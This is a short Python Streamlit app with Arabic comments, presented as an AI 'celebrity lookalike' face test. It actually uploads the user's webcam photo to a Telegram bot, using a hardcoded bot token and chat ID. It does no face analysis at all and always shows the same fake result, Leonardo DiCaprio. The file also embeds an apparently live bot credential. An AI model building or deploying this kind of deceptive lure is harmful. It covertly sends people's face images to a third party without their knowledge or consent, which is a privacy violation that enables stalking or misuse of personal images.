import streamlit as st
import requests

# --- تعديل البيانات هنا ---
# 1. استبدل النص بين العلامات برقم التوكن الذي حصلت عليه من BotFather
TOKEN = "8622793927:AAGTEaVOusAzcy_CG58TD5ZEl8VuqnMosiQr"

# 2. استبدل الرقم التالي بالـ Chat ID الذي حصلت عليه من userinfobot
CHAT_ID ="6284670726"
# -------------------------

st.title("📸 اختبار ملامح الوجه بالذكاء الاصطناعي")
st.write("التقط صورة لتعرف من تشبه من المشاهير!")

# فتح الكاميرا في المتصفح
img_file_buffer = st.camera_input("اضغط على الزر لالتقاط الصورة")

if img_file_buffer is not None:
    # تحويل الصورة إلى بيانات بايتس
    bytes_data = img_file_buffer.getvalue()
    
    # رابط إرسال الصورة عبر تليجرام
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    
    # تجهيز الملف للإرسال
    files = {'photo': ('snap.jpg', bytes_data, 'image/jpeg')}
    data = {'chat_id': CHAT_ID, 'caption': '💡 تم التقاط صورة من الموقع!'}
    
    try:
        # تنفيذ طلب الإرسال
        response = requests.post(url, files=files, data=data)
        
        # التحقق من نجاح العملية
        if response.status_code == 200:
            st.success("جاري تحليل الملامح... أنت تشبه 'ليوناردو دي كابريو'! 😎")
        else:
            st.error(f"فشل الإرسال. تأكد من توكن البوت. (خطأ: {response.status_code})")
            # هذا السطر يطبع الخطأ في شاشة الـ Logs الزرقاء لتشخيصه
            print(response.json()) 
            
    except Exception as e:
        st.error(f"حدث خطأ في الاتصال: {e}")

